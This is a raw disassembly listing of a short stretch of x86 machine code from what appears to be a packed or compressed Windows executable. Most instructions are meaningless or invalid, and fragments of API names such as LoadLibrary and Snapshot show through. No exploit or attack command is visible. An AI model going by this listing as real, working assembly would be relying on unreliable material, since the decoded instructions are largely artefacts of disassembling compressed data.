  42dc40:	ce                   	into
  42dc41:	23 8b 39 31 4b ed    	and    -0x12b4cec7(%ebx),%ecx
  42dc47:	62 07                	bound  %eax,(%edi)
  42dc49:	92                   	xchg   %eax,%edx
  42dc4a:	0b 74 10 41          	or     0x41(%eax,%edx,1),%esi
  42dc4e:	26 8b 09             	mov    %es:(%ecx),%ecx
  42dc51:	cd f0                	int    $0xf0
  42dc53:	76 a9                	jbe    0x42dbfe
  42dc55:	01 00                	add    %eax,(%eax)
  42dc57:	51                   	push   %ecx
  42dc58:	08 20                	or     %ah,(%eax)
  42dc5a:	ff 25 80 eb 05 b1    	jmp    *0xb105eb80
  42dc60:	91                   	xchg   %eax,%ecx
  42dc61:	91                   	xchg   %eax,%ecx
  42dc62:	91                   	xchg   %eax,%ecx
  42dc63:	7c 78                	jl     0x42dcdd
  42dc65:	5c                   	pop    %esp
  42dc66:	58                   	pop    %eax
  42dc67:	17                   	pop    %ss
  42dc68:	91                   	xchg   %eax,%ecx
  42dc69:	91                   	xchg   %eax,%ecx
  42dc6a:	91                   	xchg   %eax,%ecx
  42dc6b:	91                   	xchg   %eax,%ecx
  42dc6c:	54                   	push   %esp
  42dc6d:	74 50                	je     0x42dcbf
  42dc6f:	60                   	pusha
  42dc70:	93                   	xchg   %eax,%ebx
  42dc71:	91                   	xchg   %eax,%ecx
  42dc72:	91                   	xchg   %eax,%ecx
  42dc73:	91                   	xchg   %eax,%ecx
  42dc74:	64 68 6c 70 7a 02    	fs push $0x27a706c
  42dc7a:	91                   	xchg   %eax,%ecx
  42dc7b:	91                   	xchg   %eax,%ecx
  42dc7c:	60                   	pusha
  42dc7d:	60                   	pusha
  42dc7e:	85 74 24 3a          	test   %esi,0x3a(%esp)
  42dc82:	cb                   	lret
  42dc83:	44                   	inc    %esp
  42dc84:	35 30 43 dc 51       	xor    $0x51dc4330,%eax
  42dc89:	b5 c3                	mov    $0xc3,%ch
  42dc8b:	10 25 1a 69 2f 43    	adc    %ah,0x432f691a
  42dc91:	8b fb                	mov    %ebx,%edi
  42dc93:	7a 0b                	jp     0x42dca0
  42dc95:	2a 36                	sub    (%esi),%dh
  42dc97:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42dc98:	68 48 7f c0 11       	push   $0x11c07f48
  42dc9d:	11 d4                	adc    %edx,%esp
  42dc9f:	35 43 77 7c 31       	xor    $0x317c7743,%eax
  42dca4:	1c 56                	sbb    $0x56,%al
  42dca6:	5e                   	pop    %esi
  42dca7:	18 9d 0c b8 5b 2a    	sbb    %bl,0x2a5bb80c(%ebp)
  42dcad:	57                   	push   %edi
  42dcae:	fc                   	cld
  42dcaf:	85 08                	test   %ecx,(%eax)
  42dcb1:	a8 85                	test   $0x85,%al
  42dcb3:	f6 5e e7             	negb   -0x19(%esi)
  42dcb6:	3e 0c 55             	ds or  $0x55,%al
  42dcb9:	77 06                	ja     0x42dcc1
  42dcbb:	81 3c 69 3e 8a 1c 9d 	cmpl   $0x9d1c8a3e,(%ecx,%ebp,2)
  42dcc2:	5e                   	pop    %esi
  42dcc3:	04 46                	add    $0x46,%al
  42dcc5:	67 90                	addr16 nop
  42dcc7:	68 21 82 61 fa       	push   $0xfa618221
  42dccc:	32 46 6a             	xor    0x6a(%esi),%al
  42dccf:	50                   	push   %eax
  42dcd0:	82 49 f4 3c          	orb    $0x3c,-0xc(%ecx)
  42dcd4:	09 ec                	or     %ebp,%esp
  42dcd6:	6c                   	insb   (%dx),%es:(%edi)
  42dcd7:	a0 2d 57 1d 64       	mov    0x641d572d,%al
  42dcdc:	ba 5d 93 02 be       	mov    $0xbe02935d,%edx
  42dce1:	7b fb                	jnp    0x42dcde
  42dce3:	37                   	aaa
  42dce4:	1e                   	push   %ds
  42dce5:	44                   	inc    %esp
  42dce6:	24 04                	and    $0x4,%al
  42dce8:	56                   	push   %esi
  42dce9:	8b f1                	mov    %ecx,%esi
  42dceb:	83 66 2e 89          	andl   $0xffffff89,0x2e(%esi)
  42dcef:	46                   	inc    %esi
  42dcf0:	04 0d                	add    $0xd,%al
  42dcf2:	0c c7                	or     $0xc7,%al
  42dcf4:	06                   	push   %es
  42dcf5:	c0 7f ad fa          	sarb   $0xfa,-0x53(%edi)
  42dcf9:	c6                   	(bad)
  42dcfa:	f6 52 0e             	notb   0xe(%edx)
  42dcfd:	08 c4                	or     %al,%ah
  42dcff:	80 7c 24 10 43       	cmpb   $0x43,0x10(%esp)
  42dd04:	dd ce                	(bad)
  42dd06:	dd 62 82             	frstor -0x7e(%edx)
  42dd09:	1d c6 5e 55 2d       	sbb    $0x2d555ec6,%eax
  42dd0e:	e8 41 47 f6 be       	call   0xbf392454
  42dd13:	ee                   	out    %al,(%dx)
  42dd14:	05 6e 2b 08 01       	add    $0x1082b6e,%eax
  42dd19:	81 56 e8 52 46 59 1b 	adcl   $0x1b594652,-0x18(%esi)
  42dd20:	04 6d                	add    $0x6d,%al
  42dd22:	76 fb                	jbe    0x42dd1f
  42dd24:	c3                   	ret
  42dd25:	4d                   	dec    %ebp
  42dd26:	8b 48 04             	mov    0x4(%eax),%ecx
  42dd29:	89 4e 2e             	mov    %ecx,0x2e(%esi)
  42dd2c:	40                   	inc    %eax
  42dd2d:	08 56 b0             	or     %dl,-0x50(%esi)
  42dd30:	da 73 60             	fidivl 0x60(%ebx)
  42dd33:	b3 c0                	mov    $0xc0,%bl
  42dd35:	54                   	push   %esp
  42dd36:	48                   	dec    %eax
  42dd37:	04 8b                	add    $0x8b,%al
  42dd39:	1b da                	sbb    %edx,%ebx
  42dd3b:	8d 60 c3             	lea    -0x3d(%eax),%esp
  42dd3e:	6e                   	outsb  %ds:(%esi),(%dx)
  42dd3f:	1b 46 76             	sbb    0x76(%esi),%eax
  42dd42:	0c df                	or     $0xdf,%al
  42dd44:	86 86 56 e1 56 fd    	xchg   %al,-0x2a91eaa(%esi)
  42dd4a:	31 5e 93             	xor    %ebx,-0x6d(%esi)
  42dd4d:	23 0b                	and    (%ebx),%ecx
  42dd4f:	c9                   	leave
  42dd50:	ba c8 07 cc 00       	mov    $0xcc07c8,%edx
  42dd55:	4f                   	dec    %edi
  42dd56:	d0 e0                	shl    $1,%al
  42dd58:	d1 2f                	shrl   $1,(%edi)
  42dd5a:	61                   	popa
  42dd5b:	63 05 e4 1b 00 51    	arpl   %eax,0x51001be4
  42dd61:	3d 7e df b7 ae       	cmp    $0xaeb7df7e,%eax
  42dd66:	ec                   	in     (%dx),%al
  42dd67:	e4 4c                	in     $0x4c,%al
  42dd69:	9c                   	pushf
  42dd6a:	72 14                	jb     0x42dd80
  42dd6c:	81 e9 0b 2d 04 85    	sub    $0x85042d0b,%ecx
  42dd72:	01 6f ed             	add    %ebp,-0x13(%edi)
  42dd75:	f6 c7 17             	test   $0x17,%bh
  42dd78:	73 ec                	jae    0x42dd66
  42dd7a:	2b c8                	sub    %eax,%ecx
  42dd7c:	8b c4                	mov    %esp,%eax
  42dd7e:	0c 8b                	or     $0x8b,%al
  42dd80:	e1 6d                	loope  0x42ddef
  42dd82:	9f                   	lahf
  42dd83:	04 50                	add    $0x50,%al
  42dd85:	c3                   	ret
  42dd86:	79 8e                	jns    0x42dd16
  42dd88:	8d 74 4f f4          	lea    -0xc(%edi,%ecx,2),%esi
  42dd8c:	f8                   	clc
  42dd8d:	05 04 61 08 17       	add    $0x17086104,%eax
  42dd92:	c8 48 91 85          	enter  $0x9148,$0x85
  42dd96:	c8 ec 08 3e          	enter  $0x8ec,$0x3e
  42dd9a:	f8                   	clc
  42dd9b:	91                   	xchg   %eax,%ecx
  42dd9c:	68 33 db 89 5d       	push   $0x5d89db33
  42dda1:	fc                   	cld
  42dda2:	7d 84                	jge    0x42dd28
  42dda4:	9c                   	pushf
  42dda5:	cd 11                	int    $0x11
  42dda7:	7c b5                	jl     0x42dd5e
  42dda9:	0d 84 10 06 88       	or     $0x88061084,%eax
  42ddae:	6d                   	insl   (%dx),%es:(%edi)
  42ddaf:	57                   	push   %edi
  42ddb0:	38 4b cc             	cmp    %cl,-0x34(%ebx)
  42ddb3:	80 43 0c 89          	addb   $0x89,0xc(%ebx)
  42ddb7:	08 0d b6 de 91 91    	or     %cl,0x9191deb6
  42ddbd:	9c                   	pushf
  42ddbe:	7c a1                	jl     0x42dd61
  42ddc0:	a0 0c 5b 8c 54       	mov    0x548c5b0c,%al
  42ddc5:	70 37                	jo     0x42ddfe
  42ddc7:	ed                   	in     (%dx),%eax
  42ddc8:	0d e8 38 19 39       	or     $0x391938e8,%eax
  42ddcd:	1d 98 6a a5 8a       	sbb    $0x8aa56a98,%eax
  42ddd2:	91                   	xchg   %eax,%ecx
  42ddd3:	0e                   	push   %cs
  42ddd4:	2e a8 b9             	cs test $0xb9,%al
  42ddd7:	42                   	inc    %edx
  42ddd8:	32 a4 0a 76 5f 2f be 	xor    -0x41d0a08a(%edx,%ecx,1),%ah
  42dddf:	aa                   	stos   %al,%es:(%edi)
  42dde0:	61                   	popa
  42dde1:	4e                   	dec    %esi
  42dde2:	a0 f5 79 a1 78       	mov    0x78a179f5,%al
  42dde7:	bf 36 d5 fe 3f       	mov    $0x3ffed536,%edi
  42ddec:	45                   	inc    %ebp
  42dded:	94                   	xchg   %eax,%esp
  42ddee:	8d 02                	lea    (%edx),%eax
  42ddf0:	3b 74 57 e0          	cmp    -0x20(%edi,%edx,2),%esi
  42ddf4:	9c                   	pushf
  42ddf5:	50                   	push   %eax
  42ddf6:	f7 35 d0 6c 03 90    	divl   0x90036cd0
  42ddfc:	a0 c6 30 2d d8       	mov    0xd82d30c6,%al
  42de01:	32 07                	xor    (%edi),%al
  42de03:	7f 45                	jg     0x42de4a
  42de05:	cf                   	iret
  42de06:	88 c2                	mov    %al,%dl
  42de08:	32 24 a1             	xor    (%ecx,%eiz,4),%ah
  42de0b:	2c 1a                	sub    $0x1a,%al
  42de0d:	b6 f1                	mov    $0xf1,%dh
  42de0f:	ee                   	out    %al,(%dx)
  42de10:	ff 30                	push   (%eax)
  42de12:	89 75 8c             	mov    %esi,-0x74(%ebp)
  42de15:	80 3e 22             	cmpb   $0x22,(%esi)
  42de18:	75 3a                	jne    0x42de54
  42de1a:	46                   	inc    %esi
  42de1b:	08 8a 06 3a c3 35    	or     %cl,0x35c33a06(%edx)
  42de21:	3c 0d                	cmp    $0xd,%al
  42de23:	b6 3d                	mov    $0x3d,%dh
  42de25:	20 df                	and    %bl,%bh
  42de27:	f2 12 04 20          	repnz adc (%eax,%eiz,1),%al
  42de2b:	76 f2                	jbe    0x42de1f
  42de2d:	d4 d0                	aam    $0xd0
  42de2f:	4e                   	dec    %esi
  42de30:	7f e1                	jg     0x42de13
  42de32:	ee                   	out    %al,(%dx)
  42de33:	c4 a4 47 87 f6 45 d0 	les    -0x2fba0979(%edi,%eax,2),%esp
  42de3a:	e7 11                	out    %eax,$0x11
  42de3c:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  42de40:	eb fd                	jmp    0x42de3f
  42de42:	06                   	push   %es
  42de43:	9f                   	lahf
  42de44:	b7 0e                	mov    $0xe,%bh
  42de46:	2b 20                	sub    (%eax),%esp
  42de48:	76 d8                	jbe    0x42de22
  42de4a:	eb f5                	jmp    0x42de41
  42de4c:	3b 58 50             	cmp    0x50(%eax),%ebx
  42de4f:	56                   	push   %esi
  42de50:	53                   	push   %ebx
  42de51:	53                   	push   %ebx
  42de52:	73 f5                	jae    0x42de49
  42de54:	b1 01                	mov    $0x1,%cl
  42de56:	9c                   	pushf
  42de57:	60                   	pusha
  42de58:	4c                   	dec    %esp
  42de59:	51                   	push   %ecx
  42de5a:	a9 97 6a f8 19       	test   $0x19f86a97,%eax
  42de5f:	60                   	pusha
  42de60:	98                   	cwtl
  42de61:	ed                   	in     (%dx),%eax
  42de62:	6b 45 ec 60          	imul   $0x60,-0x14(%ebp),%eax
  42de66:	09 ae e8 c1 5f 6d    	or     %ebp,0x6d5fc1e8(%esi)
  42de6c:	88 50 51             	mov    %dl,0x51(%eax)
  42de6f:	e8 37 00 6d 8b       	call   0x8bafdeab
  42de74:	e4 c3                	in     $0xc3,%al
  42de76:	6c                   	insb   (%dx),%es:(%edi)
  42de77:	1b 83 88 1f 20 44    	sbb    0x44201f88(%ebx),%eax
  42de7d:	42                   	inc    %edx
  42de7e:	91                   	xchg   %eax,%ecx
  42de7f:	85 24 0f             	test   %esp,(%edi,%ecx,1)
  42de82:	0d 00 85 18 b7       	or     $0xb7188500,%eax
  42de87:	bd 91 b1 1c 05       	mov    $0x51cb191,%ebp
  42de8c:	24 34                	and    $0x34,%al
  42de8e:	d1 21                	shll   $1,(%ecx)
  42de90:	03 04 b8             	add    (%eax,%edi,4),%eax
  42de93:	c0 7b 85 14          	sarb   $0x14,-0x7b(%ebx)
  42de97:	2d 51 55 c3 c3       	sub    $0xc3c35551,%eax
  42de9c:	47                   	inc    %edi
  42de9d:	04 19                	add    $0x19,%al
  42de9f:	d9 09                	(bad) (%ecx)
  42dea1:	88 8c d4 bc 06 d8 a2 	mov    %cl,-0x5d27f944(%esp,%edx,8)
  42dea8:	fb                   	sti
  42dea9:	c3                   	ret
  42deaa:	32 93 08 cf 73 76    	xor    0x7673cf08(%ebx),%dl
  42deb0:	02 4f 87             	add    -0x79(%edi),%cl
  42deb3:	0b 94 7b b8 e9 5f d9 	or     -0x26a01648(%ebx,%edi,2),%edx
  42deba:	c5 08                	lds    (%eax),%ecx
  42debc:	ba 9d 08 fe 37       	mov    $0x37fe089d,%edx
  42dec1:	20 05 93 19 38 d5    	and    %al,0xd5381993
  42dec7:	1c 60                	sbb    $0x60,%al
  42dec9:	ee                   	out    %al,(%dx)
  42deca:	28 14 00             	sub    %dl,(%eax,%eax,1)
  42decd:	ff d0                	call   *%eax
  42decf:	34 4d                	xor    $0x4d,%al
  42ded1:	77 46                	ja     0x42df19
  42ded3:	53                   	push   %ebx
  42ded4:	d9 07                	flds   (%edi)
  42ded6:	01 e2                	add    %esp,%edx
  42ded8:	02 a8 16 46 d5 ee    	add    -0x112ab9ea(%eax),%ch
  42dede:	6b fb 26             	imul   $0x26,%ebx,%edi
  42dee1:	bb c1 1f 10 13       	mov    $0x13101fc1,%ebx
  42dee6:	4d                   	dec    %ebp
  42dee7:	b7 2f                	mov    $0x2f,%bh
  42dee9:	48                   	dec    %eax
  42deea:	5b                   	pop    %ebx
  42deeb:	01 b5 c1 06 7a 13    	add    %esi,0x137a06c1(%ebp)
  42def1:	68 6b 89 40 41       	push   $0x4140896b
  42def6:	65 8e 9b 25 8b aa 20 	mov    %gs:0x20aa8b25(%ebx),%ds
  42defd:	ff 4f 34             	decl   0x34(%edi)
  42df00:	04 b4                	add    $0xb4,%al
  42df02:	d7                   	xlat   %ds:(%ebx)
  42df03:	02 00                	add    (%eax),%al
  42df05:	01 47 65             	add    %eax,0x65(%edi)
  42df08:	74 4d                	je     0x42df57
  42df0a:	6f                   	outsl  %ds:(%esi),(%dx)
  42df0b:	64 6d                	fs insl (%dx),%es:(%edi)
  42df0d:	23 62 fb             	and    -0x5(%edx),%esp
  42df10:	75 6c                	jne    0x42df7e
  42df12:	65 46                	gs inc %esi
  42df14:	69 03 4e 78 41 13    	imul   $0x1341784e,(%ebx),%eax
  42df1a:	d6                   	salc
  42df1b:	b9 20 96 53 45       	mov    $0x45539620,%ecx
  42df20:	b6 18                	mov    $0x18,%dh
  42df22:	65 0d ec 76 8c 88    	gs or  $0x888c76ec,%eax
  42df28:	60                   	pusha
  42df29:	4d                   	dec    %ebp
  42df2a:	75 03                	jne    0x42df2f
  42df2c:	78 41                	js     0x42df6f
  42df2e:	2f                   	das
  42df2f:	d8 16                	fcoms  (%esi)
  42df31:	c4 7f 53             	les    0x53(%edi),%edi
  42df34:	74 61                	je     0x42df97
  42df36:	72 74                	jb     0x42dfac
  42df38:	75 70                	jne    0x42dfaa
  42df3a:	49                   	dec    %ecx
  42df3b:	b1 41                	mov    $0x41,%cl
  42df3d:	40                   	inc    %eax
  42df3e:	fa                   	cli
  42df3f:	2d 51 0c 48 6e       	sub    $0x6e480c51,%eax
  42df44:	6c                   	insb   (%dx),%es:(%edi)
  42df45:	3e 4c                	ds dec %esp
  42df47:	6f                   	outsl  %ds:(%esi),(%dx)
  42df48:	7b 6c                	jnp    0x42dfb6
  42df4a:	db 02                	fildl  (%edx)
  42df4c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42df4d:	46                   	inc    %esi
  42df4e:	35 65 1c 4c 61       	xor    $0x614c1c65,%eax
  42df53:	73 4d                	jae    0x42dfa2
  42df55:	c7                   	(bad)
  42df56:	be fd 36 0d 45       	mov    $0x450d36fd,%esi
  42df5b:	78 69                	js     0x42dfc6
  42df5d:	74 50                	je     0x42dfaf
  42df5f:	09 63 65             	or     %esp,0x65(%ebx)
  42df62:	73 73                	jae    0x42dfd7
  42df64:	1a 54 69 c1          	sbb    -0x3f(%ecx,%ebp,2),%dl
  42df68:	7e 5b                	jle    0x42dfc5
  42df6a:	fe                   	(bad)
  42df6b:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  42df6e:	6f                   	outsl  %ds:(%esi),(%dx)
  42df6f:	75 6e                	jne    0x42dfdf
  42df71:	74 6c                	je     0x42dfdf
  42df73:	24 72                	and    $0x72,%al
  42df75:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  42df78:	41                   	inc    %ecx
  42df79:	09 e2                	or     %esp,%edx
  42df7b:	bb db ec 70 79       	mov    $0x7970ecdb,%ebx
  42df80:	6e                   	outsb  %ds:(%esi),(%dx)
  42df81:	5a                   	pop    %edx
  42df82:	4b                   	dec    %ebx
  42df83:	67 69 4d 44 72 69 76 	imul   $0x65766972,0x44(%di),%ecx
  42df8a:	65 
  42df8b:	22 36                	and    (%esi),%dh
  42df8d:	1b 23                	sbb    (%ebx),%esp
  42df8f:	5a                   	pop    %edx
  42df90:	73 18                	jae    0x42dfaa
  42df92:	11 7b 2d             	adc    %edi,0x2d(%ebx)
  42df95:	98                   	cwtl
  42df96:	83 21 32             	andl   $0x32,(%ecx)
  42df99:	79 31                	jns    0x42dfcc
  42df9b:	46                   	inc    %esi
  42df9c:	f6 c7 96             	test   $0x96,%bh
  42df9f:	1c 61                	sbb    $0x61,%al
  42dfa1:	74 8e                	je     0x42df31
  42dfa3:	61                   	popa
  42dfa4:	64 4c                	fs dec %esp
  42dfa6:	69 62 72 b4 7e d8 bf 	imul   $0xbfd87eb4,0x72(%edx),%esp
  42dfad:	d9 79 3a             	fnstcw 0x3a(%ecx)
  42dfb0:	82 41 64 64          	addb   $0x64,0x64(%ecx)
  42dfb4:	72 86                	jb     0x42df3c
  42dfb6:	56                   	push   %esi
  42dfb7:	6f                   	outsl  %ds:(%esi),(%dx)
  42dfb8:	6c                   	insb   (%dx),%es:(%edi)
  42dfb9:	75 d9                	jne    0x42df94
  42dfbb:	83 e2 d7             	and    $0xffffffd7,%edx
  42dfbe:	f7 ce 72 6d 67 26    	test   $0x26676d72,%esi
  42dfc4:	31 6c 09 ed          	xor    %ebp,-0x13(%ecx,%ecx,1)
  42dfc8:	54                   	push   %esp
  42dfc9:	65 8f                	gs (bad)
  42dfcb:	14 11                	adc    $0x11,%al
  42dfcd:	5e                   	pop    %esi
  42dfce:	6b ce 45             	imul   $0x45,%esi,%ecx
  42dfd1:	cb                   	lret
  42dfd2:	0d f2 7d 1c 1b       	or     $0x1b1c7df2,%eax
  42dfd7:	c2 ed d0             	ret    $0xd0ed
  42dfda:	d2 2f                	shrb   %cl,(%edi)
  42dfdc:	07                   	pop    %es
  42dfdd:	65 70 28             	gs jo  0x42e008
  42dfe0:	e0 6b                	loopne 0x42e04d
  42dfe2:	41                   	inc    %ecx
  42dfe3:	f8                   	clc
  42dfe4:	37                   	aaa
  42dfe5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42dfe6:	43                   	inc    %ebx
  42dfe7:	6c                   	insb   (%dx),%es:(%edi)
  42dfe8:	6f                   	outsl  %ds:(%esi),(%dx)
  42dfe9:	73 15                	jae    0x42e000
  42dfeb:	0c 16                	or     $0x16,%al
  42dfed:	16                   	push   %ss
  42dfee:	b0 85                	mov    $0x85,%al
  42dff0:	07                   	pop    %es
  42dff1:	33 32                	xor    (%edx),%esi
  42dff3:	4e                   	dec    %esi
  42dff4:	46                   	inc    %esi
  42dff5:	74 0e                	je     0x42e005
  42dff7:	44                   	inc    %esp
  42dff8:	28 da                	sub    %bl,%dl
  42dffa:	c3                   	ret
  42dffb:	da 72 a9             	fidivl -0x57(%edx)
  42dffe:	3b 54 6f 8a          	cmp    -0x76(%edi,%ebp,2),%edx
  42e002:	bb ec df 16 f0       	mov    $0xf016dfec,%ebx
  42e007:	70 16                	jo     0x42e01f
  42e009:	53                   	push   %ebx
  42e00a:	6e                   	outsb  %ds:(%esi),(%dx)
  42e00b:	61                   	popa
  42e00c:	70 73                	jo     0x42e081
  42e00e:	68 6f 19 68 06       	push   $0x668196f
  42e013:	d8 2e                	fsubrs (%esi)
  42e015:	6c                   	insb   (%dx),%es:(%edi)
  42e016:	ae                   	scas   %es:(%edi),%al
  42e017:	64 85 53 62          	test   %edx,%fs:0x62(%ebx)
  42e01b:	0e                   	push   %cs
  42e01c:	41                   	inc    %ecx
  42e01d:	6c                   	insb   (%dx),%es:(%edi)
  42e01e:	06                   	push   %es
  42e01f:	63 66 68             	arpl   %esp,0x68(%esi)
  42e022:	f8                   	clc
  42e023:	45                   	inc    %ebp
  42e024:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42e025:	83 41 74 18          	addl   $0x18,0x74(%ecx)
  42e029:	62 9f 74 dc 7e 9a    	bound  %ebx,-0x6581238c(%edi)
  42e02f:	85 d8                	test   %ebx,%eax
  42e031:	c1 80 5f 5f 70 02 66 	roll   $0x66,0x2705f5f(%eax)
  42e038:	6d                   	insl   (%dx),%es:(%edi)
  42e039:	a2 b5 9b 3b c2       	mov    %al,0xc23b9bb5
  42e03e:	0b 88 74 5f 51 11    	or     0x11515f74(%eax),%ecx
  42e044:	46                   	inc    %esi
  42e045:	c4 9b 23 6b 0f 3f    	les    0x3f0f6b23(%ebx),%ebx
  42e04b:	3f                   	aas
  42e04c:	31 74 ad b5          	xor    %esi,-0x4b(%ebp,%ebp,4)
  42e050:	ee                   	out    %al,(%dx)
  42e051:	5f                   	pop    %edi
  42e052:	55                   	push   %ebp
  42e053:	41                   	inc    %ecx
  42e054:	45                   	inc    %ebp
  42e055:	40                   	inc    %eax
  42e056:	58                   	pop    %eax
  42e057:	5a                   	pop    %edx
  42e058:	25 63 fa 49 81       	and    $0x8149fa63,%eax
  42e05d:	c2 2b 18             	ret    $0x182b
  42e060:	ba 66 cb 5f 3e       	mov    $0x3e5fcb66,%edx
  42e065:	d4 08                	aam    $0x8
  42e067:	9e                   	sahf
  42e068:	dd 9b 6d db 6c 26    	fstpl  0x266cdb6d(%ebx)
  42e06e:	6b 08 66             	imul   $0x66,(%eax),%ecx
  42e071:	80 56 28 6d          	adcb   $0x6d,0x28(%esi)
  42e075:	61                   	popa
  42e076:	6b b7 60 58 12 6a 75 	imul   $0x75,0x6a125860(%edi),%esi
  42e07d:	2a 67 64             	sub    0x64(%edi),%ah
  42e080:	8d 0c 8f             	lea    (%edi,%ecx,4),%ecx
  42e083:	8a 59 66             	mov    0x66(%ecx),%bl
  42e086:	33 46 d6             	xor    -0x2a(%esi),%eax
  42e089:	36 6c                	ss insb (%dx),%es:(%edi)
  42e08b:	d8 c6                	fadd   %st(6),%st
  42e08d:	72 f1                	jb     0x42e080
  42e08f:	73 70                	jae    0x42e101
  42e091:	b2 74                	mov    $0x74,%dl
  42e093:	66 08 10             	data16 or %dl,(%eax)
  42e096:	5a                   	pop    %edx
  42e097:	73 87                	jae    0x42e020
  42e099:	ee                   	out    %al,(%dx)
  42e09a:	6f                   	outsl  %ds:(%esi),(%dx)
  42e09b:	69 43 63 12 07 ab c1 	imul   $0xc1ab0712,0x63(%ebx),%eax
  42e0a2:	ad                   	lods   %ds:(%esi),%eax
  42e0a3:	6d                   	insl   (%dx),%es:(%edi)
  42e0a4:	df e6                	(bad)
  42e0a6:	06                   	push   %es
  42e0a7:	0b 65 59             	or     0x59(%ebp),%esp
  42e0aa:	6f                   	outsl  %ds:(%esi),(%dx)
  42e0ab:	8a 6e 06             	mov    0x6(%esi),%ch
  42e0ae:	21 b8 19 5d 6b 6f    	and    %edi,0x6f6b5d19(%eax)
  42e0b4:	08 34 5f             	or     %dh,(%edi,%ebx,2)
  42e0b7:	0b 2f                	or     (%edi),%ebp
  42e0b9:	61                   	popa
  42e0ba:	cc                   	int3
  42e0bb:	d1 26                	shll   $1,(%esi)
  42e0bd:	c3                   	ret
  42e0be:	07                   	pop    %es
  42e0bf:	01 f0                	add    %esi,%eax
  42e0c1:	5f                   	pop    %edi
  42e0c2:	3b ed                	cmp    %ebp,%ebp
  42e0c4:	08 db                	or     %bl,%bl
  42e0c6:	42                   	inc    %edx
  42e0c7:	35 70 6e 68 54       	xor    $0x54686e70,%eax
  42e0cc:	72 33                	jb     0x42e101
  42e0ce:	19 0a                	sbb    %ecx,(%edx)
  42e0d0:	df 76 90             	fbstp  -0x70(%esi)
  42e0d3:	6d                   	insl   (%dx),%es:(%edi)
  42e0d4:	66 77 68             	data16 ja 0x42e13f
  42e0d7:	74 59                	je     0x42e132
  42e0d9:	70 07                	jo     0x42e0e2
  42e0db:	2d cf 66 18 d5       	sub    $0xd51866cf,%eax
  42e0e0:	10 40 61             	adc    %al,0x61(%eax)
  42e0e3:	74 72                	je     0x42e157
  42e0e5:	b6 c5                	mov    $0xc5,%dh
  42e0e7:	5c                   	pop    %esp
  42e0e8:	cc                   	int3
  42e0e9:	30 0d 02 07 16 68    	xor    %cl,0x68160702
  42e0ef:	08 31                	or     %dh,(%ecx)
  42e0f1:	57                   	push   %edi
  42e0f2:	70 6e                	jo     0x42e162
  42e0f4:	68 45 d8 b9 0f       	push   $0xfb9d845
  42e0f9:	1a 8f 30 6b 85 eb    	sbb    -0x147a94d0(%edi),%cl
  42e0ff:	35 43 78 78 c7       	xor    $0xc7787843,%eax
  42e104:	a1 fd 26 18 fe       	mov    0xfe1826fd,%eax
  42e109:	c4 9a 45 48 ff 22    	les    0x22ff4845(%edx),%ebx
  42e10f:	1b ef                	sbb    %edi,%ebp
  42e111:	b9 86 95 2c 54       	mov    $0x542c9586,%ecx
  42e116:	25 58 67 dd e0       	and    $0xe0dd6758,%eax
  42e11b:	de 7b fc             	fidivrs -0x4(%ebx)
  42e11e:	07                   	pop    %es
  42e11f:	a3 34 ad 6f 77       	mov    %eax,0x776fad34
  42e124:	45                   	inc    %ebp
  42e125:	dd fe                	(bad)
  42e127:	c3                   	ret
  42e128:	e3 ab                	jecxz  0x42e0d5
  42e12a:	4e                   	dec    %esi
  42e12b:	6f                   	outsl  %ds:(%esi),(%dx)
  42e12c:	33 40 59             	xor    0x59(%eax),%eax
  42e12f:	41                   	inc    %ecx
  42e130:	58                   	pop    %eax
  42e131:	50                   	push   %eax
  42e132:	02 40 5a             	add    0x5a(%eax),%al
  42e135:	7b 68                	jnp    0x42e19f
  42e137:	5d                   	pop    %ebp
  42e138:	8b c5                	mov    %ebp,%eax
  42e13a:	ab                   	stos   %eax,%es:(%edi)
  42e13b:	06                   	push   %es
  42e13c:	58                   	pop    %eax
  42e13d:	db bf 74 58 fb b6    	fstpt  -0x4904a78c(%edi)
  42e143:	36 d8 12             	fcoms  %ss:(%edx)
  42e146:	61                   	popa
  42e147:	8e 68 6e             	mov    0x6e(%eax),%gs
  42e14a:	4c                   	dec    %esp
  42e14b:	67 8f 0a d3 15       	(bad)
  42e150:	5a                   	pop    %edx
  42e151:	db 3b                	fstpt  (%ebx)
  42e153:	53                   	push   %ebx
  42e154:	73 d9                	jae    0x42e12f
  42e156:	2c 74                	sub    $0x74,%al
  42e158:	26 75 27             	es jne 0x42e182
  42e15b:	6d                   	insl   (%dx),%es:(%edi)
  42e15c:	df cc                	(bad)
  42e15e:	3c 51                	cmp    $0x51,%al
  42e160:	10 36                	adc    %dh,(%esi)
  42e162:	cd 76                	int    $0x76
  42e164:	ff c8                	dec    %eax
  42e166:	0b d9                	or     %ecx,%ebx
  42e168:	44                   	inc    %esp
  42e169:	01 77 67             	add    %esi,0x67(%edi)
  42e16c:	db 46 7b             	fildl  0x7b(%esi)
  42e16f:	47                   	inc    %edi
  42e170:	74 49                	je     0x42e1bb
  42e172:	73 43                	jae    0x42e1b7
  42e174:	68 34 20 70 05       	push   $0x5702034
  42e179:	4e                   	dec    %esi
  42e17a:	9a ad d1 1c d5 16 ea 	lcall  $0xea16,$0xd51cd1ad
  42e181:	34 e4                	xor    $0xe4,%al
  42e183:	50                   	push   %eax
  42e184:	59                   	pop    %ecx
  42e185:	96                   	xchg   %eax,%esi
  42e186:	65 7b 73             	gs jnp 0x42e1fc
  42e189:	02 34 09             	add    (%ecx,%ecx,1),%dh
  42e18c:	04 10                	add    $0x10,%al
  42e18e:	65 59                	gs pop %ecx
  42e190:	96                   	xchg   %eax,%esi
  42e191:	65 16                	gs push %ss
  42e193:	01 0d 02 17 27 50    	add    %ecx,0x50271702
  42e199:	00 96 13 03 ab 02    	add    %dl,0x2ab0313(%esi)
  42e19f:	50                   	push   %eax
  42e1a0:	ac                   	lods   %ds:(%esi),%al
  42e1a1:	88 6f 97             	mov    %ch,-0x69(%edi)
  42e1a4:	45                   	inc    %ebp
  42e1a5:	4c                   	dec    %esp
  42e1a6:	01 18                	add    %ebx,(%eax)
  42e1a8:	7e e5                	jle    0x42e18f
  42e1aa:	e7 47                	out    %eax,$0x47
  42e1ac:	3d 66 1e ea 3f       	cmp    $0x3fea1e66,%eax
